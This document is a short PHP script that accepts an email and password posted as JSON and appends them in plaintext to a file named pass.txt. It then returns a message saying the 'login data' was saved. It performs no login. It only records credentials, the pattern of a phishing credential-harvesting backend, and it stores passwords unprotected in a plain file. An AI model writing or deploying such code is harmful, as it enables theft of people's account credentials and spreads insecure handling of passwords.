<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $data = json_decode(file_get_contents('php://input'), true);

    // Validate and write to a text file
    if (isset($data['email']) && isset($data['password'])) {
        $file = fopen('pass.txt', 'a');
        if ($file) {
            fwrite($file, "Email: " . htmlspecialchars($data['email']) . "\n");
            fwrite($file, "Password: " . htmlspecialchars($data['password']) . "\n");
            fclose($file);
            echo json_encode(['message' => 'Login data written to file successfully.']);
        } else {
            echo json_encode(['error' => 'Error opening the file.']);
        }
    } else {
        echo json_encode(['error' => 'Email and password are required.']);
    }
} else {
    echo json_encode(['error' => 'Invalid request method.']);
}
?>
